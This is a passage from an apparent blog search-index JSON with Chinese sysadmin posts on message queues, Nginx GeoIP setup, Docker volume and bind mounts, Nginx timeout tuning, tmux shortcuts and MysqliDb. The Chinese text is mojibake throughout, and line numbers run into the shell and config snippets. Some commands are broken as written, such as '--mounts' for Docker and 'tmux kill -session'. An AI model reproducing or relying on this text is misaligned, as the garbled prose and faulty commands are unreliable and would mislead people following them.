ä¸ºCPUåœ¨å•ä½æ—¶é—´å†…å¤„ç†çš„è¯·æ±‚æ•°æ˜¯ä¸€å®šçš„ï¼Œå‡è®¾CPU1ç§’å†…ååé‡æ˜¯100æ¬¡ã€‚åˆ™ä¸²è¡Œæ–¹å¼1ç§’å†…CPUå¯å¤„ç†çš„è¯·æ±‚é‡æ˜¯7æ¬¡ï¼ˆ1000/150ï¼‰ã€‚å¹¶è¡Œæ–¹å¼å¤„ç†çš„è¯·æ±‚é‡æ˜¯10æ¬¡ï¼ˆ1000/100ï¼‰ã€‚ å°±è¯¥åœºæ™¯è€Œè¨€ï¼Œå¦‚ä½•çªç ´ä¼ ç»Ÿæ–¹å¼å¸¦æ¥çš„æ€§èƒ½ç“¶é¢ˆï¼Ÿ è§£å†³æ–¹æ¡ˆï¼š å¼•å…¥æ¶ˆæ¯é˜Ÿåˆ— å°†ä¸æ˜¯å¿…é¡»çš„ä¸šåŠ¡é€»è¾‘ï¼ŒåŠ å…¥é˜Ÿåˆ—ä¸­ï¼Œè¿›è¡Œå¼‚æ­¥å¤„ç†ã€‚ 2. åº”ç”¨è§£è€¦æ¶ˆæ¯é˜Ÿåˆ—æ¨¡å¼æ¶ˆæ¯é˜Ÿåˆ—åŒ…æ‹¬ä¸¤ç§æ¨¡å¼ï¼Œç‚¹å¯¹ç‚¹æ¨¡å¼ï¼ˆpoint to pointï¼Œ queueï¼‰å’Œå‘å¸ƒ/è®¢é˜…æ¨¡å¼ï¼ˆpublish/subscribeï¼Œtopicï¼‰ã€‚ ç‚¹å¯¹ç‚¹æ¨¡å¼ç‚¹å¯¹ç‚¹æ¨¡å¼åŒ…æ‹¬ä»¥ä¸‹ä¸‰ä¸ªè§’è‰²ï¼š æ¶ˆæ¯é˜Ÿåˆ— ç”Ÿäº§è€… æ¶ˆè´¹è€… ç”Ÿäº§è€…å°†æ¶ˆæ¯å‘é€åˆ°é˜Ÿåˆ—ä¸­ï¼Œæ¶ˆè´¹è€…ä»é˜Ÿåˆ—ä¸­å–å‡ºæ¶ˆæ¯è¿›è¡Œæ¶ˆè´¹ï¼Œæ¶ˆæ¯è¢«æ¶ˆè´¹ä¹‹åï¼Œæ¶ˆæ¯ä¸å†è¢«å­˜å‚¨ã€‚ ç‚¹å¯¹ç‚¹æ¨¡å¼çš„ç‰¹ç‚¹ï¼š æ¯ä¸ªæ¶ˆæ¯åªæœ‰ä¸€ä¸ªæ¥æ”¶è€…ï¼ˆConsumerï¼‰(å³ä¸€æ—¦è¢«æ¶ˆè´¹ï¼Œæ¶ˆæ¯å°±ä¸å†åœ¨æ¶ˆæ¯é˜Ÿåˆ—ä¸­)ã€‚ ç”Ÿäº§è€…å’Œæ¶ˆè´¹è€…ä¹‹é—´æ²¡æœ‰ä¾èµ–æ€§ï¼Œä¸ä¼šå› ä¸ºæ¶ˆè´¹è€…æ˜¯å¦åœ¨çº¿ï¼Œéƒ½ä¼šå­˜åœ¨äºé˜Ÿåˆ—ä¸­ã€‚ å‘å¸ƒ/è®¢é˜…æ¨¡å¼å‘å¸ƒ/è®¢é˜…æ¨¡å¼ä¸‹åŒ…æ‹¬ä¸‰ä¸ªè§’è‰²ï¼š é¢‘é“ å‘å¸ƒè€… è®¢é˜…è€… å‘å¸ƒè€…å°†æ¶ˆæ¯å‘å¸ƒåœ¨é¢‘é“ä¸­ï¼Œé¢‘é“å°†æ¶ˆæ¯ä¼ é€’ç»™æ‰€æœ‰è®¢é˜…è€…ã€‚ å‘å¸ƒ/è®¢é˜…æ¨¡å¼ç‰¹ç‚¹ï¼š æ¯ä¸ªæ¶ˆæ¯å¯ä»¥æœ‰å¤šä¸ªè®¢é˜…è€… å‘å¸ƒè€…å’Œè®¢é˜…è€…ä¹‹é—´å­˜åœ¨ä¾èµ–å…³ç³»ï¼Œå¿…é¡»å…ˆè®¢é˜…é¢‘é“ï¼Œå‘å¸ƒè€…å‘å¸ƒçš„æ¶ˆæ¯æ‰ä¼šè¢«è®¢é˜…è€…æ‰€æ¥æ”¶ã€‚ å› ä¸ºå‘å¸ƒçš„æ¶ˆæ¯æ˜¯æ— çŠ¶æ€çš„ï¼Œæ‰€ä»¥è®¢é˜…è€…éœ€è¦è®¢é˜…é¢‘é“ä¸”åœ¨çº¿ã€‚ å¸¸ç”¨æ¶ˆæ¯é˜Ÿåˆ— RabbitMQ ActiveMQ RocketMQ Kafka Redis å‚è€ƒé“¾æ¥ ä¸ºä»€ä¹ˆä¼šéœ€è¦æ¶ˆæ¯é˜Ÿåˆ—(MQ)ï¼Ÿ PHP(Mysql/Redis)æ¶ˆæ¯é˜Ÿåˆ—çš„ä»‹ç»åŠåº”ç”¨åœºæ™¯æ¡ˆä¾‹ æ¶ˆæ¯é˜Ÿåˆ—åŠå¸¸è§æ¶ˆæ¯é˜Ÿåˆ—ä»‹ç» PHPå¤§é‡æ•°æ®å†™å…¥æ–‡æ¡£ï¼Œå¦‚ä½•å¼‚æ­¥å¤„ç†ï¼Ÿ","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"},{"name":"MQ","slug":"MQ","permalink":"https://www.0x2beace.com/tags/MQ/"}]},{"title":"Nginx å¦‚ä½•æ ¹æ® IP è·å–åœ°åŸŸä¿¡æ¯","slug":"how-does-nginx-obtain-geographic-information-based-on-ip","date":"2020-10-08T09:29:34.000Z","updated":"2020-10-11T12:01:45.888Z","comments":true,"path":"how-does-nginx-obtain-geographic-information-based-on-ip/","link":"","permalink":"https://www.0x2beace.com/how-does-nginx-obtain-geographic-information-based-on-ip/","excerpt":"æœ€è¿‘æœ‰ä¸€ä¸ªéœ€æ±‚ï¼šéœ€è¦æ ¹æ®ç”¨æˆ·çš„IP è·å–å…¶å›½å®¶ï¼Œç„¶åæ ¹æ®ä¸åŒå›½å®¶è¿›è¡Œä»£ç†è½¬å‘ã€‚","text":"æœ€è¿‘æœ‰ä¸€ä¸ªéœ€æ±‚ï¼šéœ€è¦æ ¹æ®ç”¨æˆ·çš„IP è·å–å…¶å›½å®¶ï¼Œç„¶åæ ¹æ®ä¸åŒå›½å®¶è¿›è¡Œä»£ç†è½¬å‘ã€‚ æƒ³è¦å®Œæˆè¿™ä¸ªéœ€æ±‚ï¼Œé¦–å…ˆç¬¬ä¸€ä¸ªè§£å†³çš„é—®é¢˜å°±æ˜¯è·å–IP åœ°å€æ‰€å¯¹åº”çš„åœ°ç†ä½ç½®ï¼š è¿™ä¸ªéœ€æ±‚é€šå¸¸æ˜¯ç”± GeoIP è¿™ä¸ªæ¨¡å—æ¥å®Œæˆçš„ï¼ŒNginx é»˜è®¤æ²¡æœ‰å¼€å¯è¯¥æ¨¡å—ã€‚ GeoIP æ˜¯åŸºäº maxmind æä¾›çš„æ•°æ®æ–‡ä»¶è¿›è¡Œåˆ†æçš„ï¼Œæ‰€ä»¥è¿˜éœ€è¦ä¸‹è½½ maxmind çš„æ•°æ®æºæ–‡ä»¶ã€‚ å®‰è£…GeoIP æ¨¡å—å‰é¢ä¹Ÿæåˆ°äº†MaxMind GeoLite Legacyæ•°æ®åº“ç›®å‰å·²åœäº§ï¼Œåº”æ”¹ç”¨MaxMind GeoIP2æˆ–Geolite2æ•°æ®åº“å’ŒNGINX Plus GeoIP2æ¨¡å—ã€‚ Centosï¼š 1yum install nginx-plus-module-geoip2 Ubuntuï¼š 1sudo apt-get install nginx-plus-module-geoip2 ç„¶åå°† load_module æŒ‡ä»¤éƒ½æ”¾åœ¨nginx.conf çš„é…ç½®æ–‡ä»¶çš„é¡¶éƒ¨ï¼š 123456load_module modules&#x2F;ngx_http_geoip2_module.so;load_module modules&#x2F;ngx_stream_geoip2_module.so;http &#123; ...&#125; å®‰è£… GeoIP æ•°æ®æºè‡ªä» 2019å¹´12æœˆ30æ—¥å¼€å§‹ï¼Œå°±ä¸èƒ½ç›´æ¥ä»MaxMind ä¸Šä¸‹è½½äº†ï¼Œéœ€è¦å…ˆæ³¨å†Œä¸€ä¸ªè´¦å·ï¼Œè·å– license keyï¼Œç„¶åwget æ—¶å¸¦ä¸Š keyã€‚å…·ä½“å¯ä»¥æŸ¥é˜…è¿™ç¯‡æ–‡ç« ã€‚ è¿™æ˜¯ä¸€ç§å®‰è£…æ–¹å¼ï¼Œå¦‚æœè§‰å¾—éº»çƒ¦ï¼Œå¯ä»¥å°è¯•ä¸‹é¢è¿™ç§æ–¹å¼ã€‚ å®‰è£…ä¾èµ–ï¼š 123sudo add-apt-repository ppa:maxmind&#x2F;ppasudo apt updatesudo apt install libgeoip1 libgeoip-dev geoip-bin ä¸‹è½½æºç åŒ…ï¼Œå®‰è£…åº”ç”¨ï¼š 123456sudo wget https:&#x2F;&#x2F;github.com&#x2F;maxmind&#x2F;geoip-api-c&#x2F;releases&#x2F;download&#x2F;v1.6.12&#x2F;GeoIP-1.6.12.tar.gzsudo tar -zxvf GeoIP-1.6.12.tar.gzcd GeoIP-1.6.12 &amp;&amp; \\.&#x2F;configure &amp;&amp; \\make &amp;&amp; sudo make install æŸ¥æ‰¾GeoIP.datæ‰€åœ¨ä½ç½®ï¼š 12sudo find &#x2F; -name GeoIP.dat&#x2F;usr&#x2F;share&#x2F;GeoIP&#x2F;GeoIP.dat åœ¨é…ç½®æ–‡ä»¶ä¸­ä½¿ç”¨ï¼š 12345678910geoip_country &#x2F;etc&#x2F;nginx&#x2F;geoip&#x2F;GeoIP-1.6.12&#x2F;data&#x2F;GeoIP.dat;server &#123; ... location &#x2F;myip &#123; default_type text&#x2F;plain; return 200 &quot;$remote_addr $geoip_country_name $geoip_country_code $geoip_city&quot;; &#125;&#125; é€šè¿‡ä»¥ä¸‹å˜é‡ç»¼åˆè·å–åœ°åŸŸä¿¡æ¯ï¼š $remote_addrï¼šIPåœ°å€ $geoip_country_nameï¼šå›½å®¶ $geoip_country_codeï¼šå¯¹åº”ç¼–ç  $geoip_cityï¼šåŸå¸‚åç§° å‚è€ƒé“¾æ¥ nginx: [emerg] unknown directive â€œgeoip_countryâ€ in /etc/nginx/nginx.conf:23 install GeoIP install GeoIP module","categories":[{"name":"Nginx","slug":"Nginx","permalink":"https://www.0x2beace.com/categories/Nginx/"}],"tags":[{"name":"Nginx","slug":"Nginx","permalink":"https://www.0x2beace.com/tags/Nginx/"}]},{"title":"Docker æ•°æ®æŒ‚è½½","slug":"docker-data-mount","date":"2020-10-07T12:24:01.000Z","updated":"2020-10-07T12:24:40.708Z","comments":true,"path":"docker-data-mount/","link":"","permalink":"https://www.0x2beace.com/docker-data-mount/","excerpt":"","text":"æ•°æ®æŒ‚è½½æ•°æ®æŒ‚è½½åœ¨Docker ä¸­è¿˜æ˜¯æŒºé‡è¦çš„ä¸€éƒ¨åˆ†ï¼Œå› ä¸ºæœ‰å¤šç§æ–¹å¼ï¼Œè€Œä¸åŒçš„æ–¹å¼æ‰€å¯¹åº”çš„å¤„ç†æ•°æ®çš„é€»è¾‘ä¹Ÿä¸ä¸€æ ·ã€‚ Volumesï¼šDocker ç®¡ç†å®¿ä¸»æœºæ–‡ä»¶ç³»ç»Ÿçš„ä¸€éƒ¨åˆ†ï¼ˆ/var/lib/docker/volumesï¼‰ã€‚ Bind Mountsï¼šå°†å®¿ä¸»æœºä¸Šçš„ä»»æ„ä½ç½®çš„æ–‡ä»¶æˆ–ç›®å½•æŒ‚è½½åˆ°å®¹å™¨ä¸­ã€‚ tmpfsï¼šæŒ‚è½½å­˜å‚¨åœ¨ä¸»æœºç³»ç»Ÿçš„å†…å­˜ä¸­ï¼Œè€Œä¸ä¼šå†™å…¥ä¸»æœºçš„æ–‡ä»¶ç³»ç»Ÿã€‚å¦‚æœä¸ç³»ç»Ÿå°†æ•°æ®æŒä¹…å­˜å‚¨åœ¨ä»»ä½•ä½ç½®ï¼Œå¯ä»¥ä½¿ç”¨tmpfsï¼ŒåŒæ—¶é¿å…å†™å…¥å®¹å™¨å¯å†™å±‚æé«˜æ€§èƒ½ã€‚ è¿™é‡Œä¸»è¦ä»‹ç»å‰ä¸¤è€…ï¼Œåè€…ä½¿ç”¨çš„å¹¶ä¸å¤šã€‚æ³¨æ„ç¬¬ä¸€ç§å’Œç¬¬äºŒç§æ˜¯å­˜åœ¨åŒºåˆ«çš„ï¼Œå‰è€…æ˜¯ä½¿ç”¨çš„æ•°æ®å·è¿›è¡ŒæŒ‚è½½ï¼Œè€Œåè€…åˆ™æ˜¯ç›´æ¥ä½¿ç”¨çš„å®¿ä¸»æœºä¸Šçš„æ–‡ä»¶æˆ–è€…ç›®å½•æŒ‚è½½åˆ°å®¹å™¨ä¸­ã€‚ ä¼—æ‰€å‘¨çŸ¥ï¼Œå°†å®¹å™¨åˆ é™¤ä¹‹åï¼Œå®¹å™¨å†…æ‰€æœ‰çš„æ”¹åŠ¨å°†ä¸å¤å­˜åœ¨ã€‚ æŒ‚è½½æ•°æ®å·é€šå¸¸æ˜¯æœ€å¸¸ç”¨ä¸”æœ€å¥½çš„æ–¹å¼ï¼Œè¿™ç§æ–¹å¼ä¼šå°†å®¹å™¨ä¸­çš„æ•°æ®æŒä¹…åŒ–åœ¨å®¿ä¸»æœºä¸­ï¼Œè¿™æ ·åšçš„å¥½å¤„å°±æ˜¯å½“å®¹å™¨è¢«åˆ é™¤æˆ–è€…æ— æ³•æ­£å¸¸å¯åŠ¨æ—¶ï¼Œæ•°æ®ä»æ˜¯å®Œæ•´çš„ã€‚ æŒ‚è½½æ•°æ®å·æœ‰ä¸¤ç§æ–¹å¼ï¼š ä½¿ç”¨--mount ä½¿ç”¨-v å‰è€…æ˜¯æ–°ç‰ˆæœ¬çš„æ–¹å¼ï¼Œåè€…æ˜¯è€ç‰ˆæœ¬çš„æ–¹å¼ï¼Œå…¶æ•ˆæœéƒ½æ˜¯ä¸€æ ·çš„ã€‚ Volumesåˆ›å»ºä¸€ä¸ªæ•°æ®å·ï¼š 1docker volume create &lt;volume name&gt; åˆ—å‡ºæ•°æ®å·åˆ—è¡¨ï¼š 1docker volume ls åˆ—å‡ºæ•°æ®å·çš„è¯¦æƒ…ä¿¡æ¯ï¼š 1docker volume inspect &lt;volume name&gt; åˆ é™¤æ•°æ®å·ï¼š 1docker volume rm &lt;volume name&gt; ç”¨æ•°æ®å·åˆ›å»ºä¸€ä¸ªå®¹å™¨ï¼š 123456789# æ–°ç‰ˆæœ¬docker run -d -it \\--name&#x3D;nginx --mount src&#x3D;&lt;volume name&gt;,dst&#x3D;&#x2F;usr&#x2F;share&#x2F;nginx&#x2F;html \\nginx# è€ç‰ˆæœ¬docker run -d -it \\--name&#x3D;nginx -v &lt;volume name&gt;:&#x2F;usr&#x2F;share&#x2F;nginx&#x2F;html \\nginx éœ€è¦æ³¨æ„çš„æ˜¯ï¼š å¦‚æœæ²¡æœ‰æŒ‡å®šæ•°æ®å·ï¼Œåˆ™ä¼šè‡ªåŠ¨åˆ›å»º Bind Mountsä½¿ç”¨bind mounts åˆ›å»ºä¸€ä¸ªå®¹å™¨ï¼š 12345678910111213# æ–°ç‰ˆæœ¬docker run -d -it \\--name nginx \\-p 8080:80 \\--mounts type&#x3D;bind,src&#x3D;&#x2F;var&#x2F;www,dst&#x3D;&#x2F;usr&#x2F;share&#x2F;nginx&#x2F;html \\nginx# è€ç‰ˆæœ¬docker run -d -it \\--name nginx \\-p 8080:80 \\-v &#x2F;var&#x2F;www:&#x2F;usr&#x2F;share&#x2F;nginx&#x2F;html \\nginx éœ€è¦æ³¨æ„çš„æ˜¯ï¼š å¦‚æœæºæ–‡ä»¶/ç›®å½•æ²¡æœ‰å­˜åœ¨ï¼Œdocker ä¸ä¼šè‡ªåŠ¨åˆ›å»ºï¼Œè€Œä¼šè‡ªåŠ¨æŠ›å‡ºä¸€ä¸ªé”™è¯¯ã€‚ å¦‚æœæŒ‚è½½ç›®æ ‡åœ¨å®¹å™¨ä¸­æ˜¯éç©ºç›®å½•ï¼Œåˆ™è¯¥ç›®å½•ç°æœ‰å†…å®¹å°†è¢«éšè—ã€‚","categories":[{"name":"Docker","slug":"Docker","permalink":"https://www.0x2beace.com/categories/Docker/"}],"tags":[{"name":"Docker","slug":"Docker","permalink":"https://www.0x2beace.com/tags/Docker/"}]},{"title":"nginx è¶…æ—¶é—®é¢˜â€”â€”upstream timed out (110: Connection timed out) while reading response header from upstream","slug":"nginx-timeout-problem-upstream-timed-out-110-Connection-timed-out-while-reading-response-header-from-upstream","date":"2020-10-05T12:28:45.000Z","updated":"2020-10-05T12:29:53.756Z","comments":true,"path":"nginx-timeout-problem-upstream-timed-out-110-Connection-timed-out-while-reading-response-header-from-upstream/","link":"","permalink":"https://www.0x2beace.com/nginx-timeout-problem-upstream-timed-out-110-Connection-timed-out-while-reading-response-header-from-upstream/","excerpt":"ä»Šå¤©æ—©ä¸Šèµ·æ¥ï¼Œå‘ç°åå°ç™»å½•ä¸ä¸Šï¼Œæ‰“å¼€æ§åˆ¶å°å‘ç°å‡ ä¹æ‰€æœ‰è¯·æ±‚éƒ½è¶…æ—¶äº†ã€‚","text":"ä»Šå¤©æ—©ä¸Šèµ·æ¥ï¼Œå‘ç°åå°ç™»å½•ä¸ä¸Šï¼Œæ‰“å¼€æ§åˆ¶å°å‘ç°å‡ ä¹æ‰€æœ‰è¯·æ±‚éƒ½è¶…æ—¶äº†ã€‚ æ‰“å¼€nginx çš„å¼‚å¸¸æ—¥å¿—å¯ä»¥çœ‹åˆ°å…¨æ˜¯ç›¸åŒçš„å¼‚å¸¸ï¼š upstream timed out (110: Connection timed out) while reading response header from upstream ä»è¿™ä¸ªå¼‚å¸¸æ—¥å¿—å¯ä»¥åˆ†æå‡ºï¼Œç”±äºnginx ä»£ç†å»è·å–ä¸Šæ¸¸æœåŠ¡å™¨çš„å“åº”è¶…æ—¶äº†ï¼Œé‚£ä¹ˆç©¶ç«Ÿæ˜¯ä»€ä¹ˆåŸå› å¯¼è‡´å®ƒä¼šè¶…æ—¶å‘¢ï¼Ÿ é€šå¸¸ä¼šå¯¼è‡´è¯·æ±‚è¶…æ—¶å¯èƒ½æœ‰ä»¥ä¸‹å‡ ä¸ªåŸå› ï¼š æ¥å£æ¯”è¾ƒå¤æ‚ï¼Œå“åº”æ—¶é—´æ…¢ï¼Œå¯¼è‡´è¶…æ—¶ã€‚ å¤„ç†è¯·æ±‚çš„è¿›ç¨‹å¼‚å¸¸ã€‚ ä»£ç†æœåŠ¡å™¨ä¸ä¸Šæ¸¸æœåŠ¡å™¨çš„ç½‘ç»œé—®é¢˜ã€‚ å› ä¸ºè¯·æ±‚ä¸€ç›´éƒ½æ˜¯é‚£äº›è¯·æ±‚ï¼Œæ‰€ä»¥ç¬¬ä¸€ç§å¯èƒ½æ€§å¯ä»¥æ’é™¤ã€‚å¦å¤–å­è¿›ç¨‹æ•°é‡è®¾ç½®çš„æ˜¯æ¯”è¾ƒå¤§ï¼Œæ‰€ä»¥ç¬¬äºŒç§åº”è¯¥ä¹Ÿå¯ä»¥æ’é™¤ã€‚ å¯¹äºæœåŠ¡å™¨çš„ç½‘ç»œé—®é¢˜ï¼Œå¦‚æœæ¡ä»¶å…è®¸ï¼Œå¯ä»¥ç›´æ¥ä»æ ¹æœ¬ä¸Šè§£å†³ï¼Œå¦å¤–ä¹Ÿå¯ä»¥é€šè¿‡è®¾ç½®è¶…æ—¶æ—¶é—´æ¥å»¶ç¼“è¯·æ±‚è¶…æ—¶ã€‚ åœ¨server ä¸­æ·»åŠ ä»¥ä¸‹é…ç½®ï¼š 1234567891011large_client_header_buffers 4 16k;client_max_body_size 30m;client_body_buffer_size 128k;proxy_connect_timeout 240s;proxy_read_timeout 240s;proxy_send_timeout 240s;proxy_buffer_size 64k;proxy_buffers 4 32k;proxy_busy_buffers_size 64k;proxy_temp_file_write_size 64k; ç„¶åé‡å¯Nginxã€‚ å‚è€ƒé“¾æ¥ nginx è®¾ç½®è¶…æ—¶æ—¶é—´-Nginx å®˜ç½‘","categories":[{"name":"Nginx","slug":"Nginx","permalink":"https://www.0x2beace.com/categories/Nginx/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"},{"name":"Nginx","slug":"Nginx","permalink":"https://www.0x2beace.com/tags/Nginx/"}]},{"title":"Tmux å¿«é€Ÿä¸Šæ‰‹","slug":"tmux-quick-start","date":"2020-10-04T12:39:38.000Z","updated":"2020-10-04T12:41:19.876Z","comments":true,"path":"tmux-quick-start/","link":"","permalink":"https://www.0x2beace.com/tmux-quick-start/","excerpt":"","text":"æœ¬æ¥ä¹‹å‰å°±çŸ¥é“æœ‰ tmux è¿™æ ·ä¸€ä¸ªçª—å£åˆ†éš”å·¥å…·ï¼Œåªä¸è¿‡ä¸€ç›´ä½¿ç”¨ç€iTerm2ï¼Œæœ¬èº«å°±è‡ªå¸¦æœ‰æ ‡ç­¾é¡µåŠŸèƒ½ï¼Œæ‰€ä»¥å°±ä¸€ç›´æ²¡å»å­¦ä¹ è¿™ä¸ªå·¥å…·ã€‚ è¿™æ®µæ—¶é—´éœ€è¦ç»å¸¸è®¿é—®LinuxæœåŠ¡å™¨ï¼Œæ‰€ä»¥åœ¨æœåŠ¡å™¨ä¸Šå®‰è£…äº†è¿™ä¸ªå·¥å…·ã€‚ å®‰è£…Macï¼š 1brew install tmux Linux: 1apt-get install tmux ä¸€èˆ¬æƒ…å†µä¸‹ tmux ä¸­æ‰€æœ‰çš„å¿«æ·é”®éƒ½éœ€è¦å’Œå‰ç¼€å¿«æ·é”® âŒƒb æ¥ç»„åˆä½¿ç”¨ï¼ˆæ³¨ï¼šâŒƒ ä¸º Mac çš„ control é”®ï¼‰ï¼Œä»¥ä¸‹æ˜¯å¸¸ç”¨çš„çª—æ ¼ï¼ˆpaneï¼‰å¿«æ·é”®åˆ—è¡¨ã€‚ ä¼šè¯ç¬¬ä¸€æ¬¡ä½¿ç”¨tmux å¯èƒ½ä¼šè¢«Sessionã€çª—å£ã€çª—æ ¼ è¿™äº›é™Œç”Ÿçš„æ¦‚å¿µï¼Œå¼„å¾—æ‘¸ä¸ç€å¤´è„‘ã€‚ è¿™é‡Œæ€»ç»“æˆä¸€å¥è¯å°±æ˜¯ï¼šä¸€ä¸ªå®Œæ•´çš„ä¼šè¯ï¼ˆSessionï¼‰æ˜¯ç”±æ•°ä¸ªçª—å£ç»„æˆï¼Œè€Œä¸€ä¸ªçª—å£åˆå¯ä»¥åˆ†æˆè‹¥å„ä¸ªçª—æ ¼ã€‚ ä½¿ç”¨tmux å‘½ä»¤ä¼šé»˜è®¤æ–°å»ºä¸€ä¸ªtmux ä¼šè¯ï¼š 12&#x2F;&#x2F; é»˜è®¤æ–°å»ºä¸€ä¸ªSession åç§°ä¸º 0 çš„çª—å£ã€‚tmux å¸¸ç”¨Sessionæ“ä½œï¼š $ é‡å‘½åå½“å‰ä¼šè¯ s é€‰æ‹©ä¼šè¯åˆ—è¡¨ d é€€å‡ºå½“å‰ä¼šè¯ï¼ˆä¸æ˜¯åˆ é™¤ï¼‰ï¼Œè¿è¡Œåå°†ä¼šé€€å‡º tmux è¿›ç¨‹ï¼Œè¿”å›è‡³ shell ä¸»è¿›ç¨‹ã€‚ çª—å£çª—å£çš„æ¦‚å¿µä¸åŒäºçª—æ ¼ï¼Œçª—å£äº’ä¸å½±å“ï¼Œçª—æ ¼ç›¸äº’åˆ†éš”ã€‚ å¸¸ç”¨çª—å£æ“ä½œï¼š c æ–°å»ºçª—å£ï¼Œæ­¤æ—¶å½“å‰çª—å£ä¼šåˆ‡æ¢è‡³æ–°çª—å£ï¼Œä¸å½±å“åŸæœ‰çª—å£çš„çŠ¶æ€ p åˆ‡æ¢è‡³ä¸Šä¸€çª—å£ n åˆ‡æ¢è‡³ä¸‹ä¸€çª—å£ w çª—å£åˆ—è¡¨é€‰æ‹©ï¼Œæ³¨æ„ macOS ä¸‹ä½¿ç”¨ âŒƒp å’Œ âŒƒn è¿›è¡Œä¸Šä¸‹é€‰æ‹© &amp; å…³é—­å½“å‰çª—å£ , é‡å‘½åçª—å£ï¼Œå¯ä»¥ä½¿ç”¨ä¸­æ–‡ï¼Œé‡å‘½ååèƒ½åœ¨ tmux çŠ¶æ€æ æ›´å¿«é€Ÿçš„è¯†åˆ«çª—å£ id 0 åˆ‡æ¢è‡³ 0 å·çª—å£ï¼Œä½¿ç”¨å…¶ä»–æ•°å­— id åˆ‡æ¢è‡³å¯¹åº”çª—å£ f æ ¹æ®çª—å£åæœç´¢é€‰æ‹©çª—å£ï¼Œå¯æ¨¡ç³ŠåŒ¹é… çª—æ ¼çª—æ ¼æ˜¯åœ¨çª—å£ä¸‹çš„æ¦‚å¿µï¼Œè‹¥å¹²ä¸ªçª—æ ¼ç»„æˆä¸€ä¸ªçª—å£ã€‚ å¸¸ç”¨çª—æ ¼æ“ä½œï¼š % å·¦å³å¹³åˆ†å‡ºä¸¤ä¸ªçª—æ ¼ â€œ ä¸Šä¸‹å¹³åˆ†å‡ºä¸¤ä¸ªçª—æ ¼ x å…³é—­å½“å‰çª—æ ¼ { å½“å‰çª—æ ¼å‰ç§» } å½“å‰çª—æ ¼åç§» ; é€‰æ‹©ä¸Šæ¬¡ä½¿ç”¨çš„çª—æ ¼ o é€‰æ‹©ä¸‹ä¸€ä¸ªçª—æ ¼ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨ä¸Šä¸‹å·¦å³æ–¹å‘é”®æ¥é€‰æ‹© space åˆ‡æ¢çª—æ ¼å¸ƒå±€ï¼Œtmux å†…ç½®äº†äº”ç§çª—æ ¼å¸ƒå±€ï¼Œä¹Ÿå¯ä»¥é€šè¿‡ âŒ¥1 è‡³ âŒ¥5æ¥åˆ‡æ¢ z æœ€å¤§åŒ–å½“å‰çª—æ ¼ï¼Œå†æ¬¡æ‰§è¡Œå¯æ¢å¤åŸæ¥å¤§å° q æ˜¾ç¤ºæ‰€æœ‰çª—æ ¼çš„åºå·ï¼Œåœ¨åºå·å‡ºç°æœŸé—´æŒ‰ä¸‹å¯¹åº”çš„æ•°å­—ï¼Œå³å¯è·³è½¬è‡³å¯¹åº”çš„çª—æ ¼ å…¶ä»–å‘½ä»¤ä¸Šé¢é‚£äº›å‘½ä»¤éƒ½æ˜¯é…åˆâŒƒ + bå¿«æ·é”®ä½¿ç”¨çš„ï¼Œä¸‹é¢çš„è¿™äº›å‘½ä»¤éƒ½æ˜¯åœ¨Shellè¿›ç¨‹ä¸­ç›´æ¥æ‰§è¡Œçš„ã€‚ æ–°å»ºåç§°ä¸º foo çš„ä¼šè¯ 1tmux new -s foo åˆ—å‡ºæ‰€æœ‰ tmux ä¼šè¯ 1tmux ls æ¢å¤ä¸Šä¸€æ¬¡ä¼šè¯ 1tmux a æ¢å¤åä¸º foo çš„ä¼šè¯ 1tmux a -t foo åˆ é™¤åä¸º foo çš„ä¼šè¯ 1tmux kill -session -t foo åˆ é™¤æ‰€æœ‰ä¼šè¯ 1tmux kill -server tmux or iterm2tmux å’ŒiTerm2 éƒ½æœ‰çª—å£ç®¡ç†æ–¹é¢çš„åŠŸèƒ½ï¼Œåªæ˜¯å‰è€…ç›¸æ¯”åè€…çš„ä¼˜åŠ¿åœ¨äºï¼š iTerm2 çš„çª—æ ¼åˆ‡æ¢å¿«æ·é”®ï¼ˆâŒ˜âŒ¥â†’ï¼‰å®¹æ˜“ä¸å…¶ä»–è½¯ä»¶å…¨å±€å¿«æ·é”®å†²çªï¼ˆä¾‹å¦‚ Spectacle çš„çª—å£åˆ†å‰²å¿«æ·é”®ï¼‰ï¼Œtmux ç”±äºå­˜åœ¨å‰ç¼€å¿«æ·é”®ï¼Œæ‰€ä»¥ä¸å­˜åœ¨å¿«æ·é”®å†²çªé—®é¢˜ï¼› tmux å¯ä»¥åœ¨ç»ˆç«¯è½¯ä»¶é‡å¯åé€šè¿‡å‘½ä»¤è¡Œæ¢å¤ä¸Šæ¬¡çš„ session ï¼Œè€Œç»ˆç«¯è½¯ä»¶åˆ™ä¸è¡Œï¼› tmux ç®€æ´ä¼˜é›…ã€è®¢åˆ¶æ€§å¼ºï¼Œå­¦ä¼šä¹‹åä¹Ÿèƒ½åœ¨ Linux ä¸Šä½¿ç”¨ï¼Œæœ‰åŠ©äºé€¼æ ¼æå‡ã€‚ å‚è€ƒé“¾æ¥ Tmux å¿«æ·é”®&amp;é€ŸæŸ¥è¡¨&amp;ç®€æ˜æ•™ç¨‹ ååˆ†é’Ÿå­¦ä¼š Tmux [Tmux å¿«æ·é”®å’Œå¤‡å¿˜å½•](","categories":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/categories/Linux/"},{"name":"Mac","slug":"Linux/Mac","permalink":"https://www.0x2beace.com/categories/Linux/Mac/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/tags/Linux/"},{"name":"Mac","slug":"Mac","permalink":"https://www.0x2beace.com/tags/Mac/"},{"name":"Terminal","slug":"Terminal","permalink":"https://www.0x2beace.com/tags/Terminal/"}]},{"title":"MysqliDb å¿«é€Ÿä¸Šæ‰‹","slug":"mysqlidb-is-quick-to-get-started","date":"2020-10-02T07:26:03.000Z","updated":"2020-10-02T07:27:10.385Z","comments":true,"path":"mysqlidb-is-quick-to-get-started/","link":"","permalink":"https://www.0x2beace.com/mysqlidb-is-quick-to-get-started/","excerpt":"","text":"MysqliDb æ˜¯åŸºäº mysqli æ‰©å±•å‡ºæ¥çš„ä¸€ä¸ªç±»åº“ï¼Œå…¶ä¸­å°è£…äº†å¾ˆå¤šå¸¸ç”¨çš„Mysql 